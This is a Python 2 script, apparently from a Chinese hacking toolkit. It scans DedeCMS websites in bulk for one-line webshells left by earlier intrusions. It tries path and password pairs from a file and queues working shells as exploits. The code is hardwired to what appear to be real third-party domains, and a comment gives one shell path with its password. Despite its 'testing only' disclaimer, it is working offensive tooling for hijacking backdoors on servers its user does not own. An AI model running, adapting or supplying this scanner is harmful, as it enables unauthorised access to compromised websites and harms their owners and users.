#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
##神龙:29295842    BLOG:http://hi.baidu.com/alalmn
#本软件只是测试使用  大家别乱想啊
#批量测试有可能存在的  一句话

import httplib
import sys
import threading
sys.path.append('..')
import Class_Queue
import yijuhua

###########dedecms官方一句话扫描##########################
class eval_cs(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #URL
        if not(("http://" in self.url) or ("https://" in self.url)):
            self.url="http://"+self.url
        self.list=[]

    def run(self):
        try:
            self.scan(self.url)
        except Exception,e:
            #print e
            return 0

    def look_add_file(self):
        list=[]
        list_2=[]
        xxx = file("cs_eval.txt", 'r')
        for xxx_line in xxx.readlines():  #读取数据
            #如果输入的内容读取有回车符号，可以用strip来消除，可得到完美的输出
            data=xxx_line.strip().lstrip()   #清除前后空格
            if len(data)<=7:
                continue   #跳过
            list.append(data)  #添加数据
        for i in list:  #去重重复数据
            if i not in list_2:
                list_2.append(i)
        for i in list_2:  #添加到数组
            self.list.append(i)  #添加数据

    def bool_asp_php(self,s0): #查看一句话是语句的一句话
        if (".asp" in str(s0) or ".ASP" in str(s0) or ".Asp" in str(s0)):
            return "asp"
        if (".php" in str(s0) or ".PHP" in str(s0) or ".Php" in str(s0)):
            return "php"

    def scan(self,url):
        self.look_add_file() #添加数据
        for i in self.list:  #
            ss = i.split("|")
            if len(ss)>=2:
                url2=url+ss[0]
                if yijuhua.yijuhua_cs(self.bool_asp_php(url2),url2,str(ss[1])):   #ASP还是PHP  ,URL地址 ，密码
                #是
                    EXP_list=[self.url,"exp","exp_eval",url2,str(ss[1]),"webshell"]
                    ##["网址","漏洞类型","漏洞详细信息","漏洞地址","密码","备注"]
                    #print EXP_list
                    Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列


################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(eval_cs("http://www.szlsfw.com"))
#http://www.647.com.cn/plus/mytag_js.php?aid=9090|guige
    for t in threads:
        t.start()







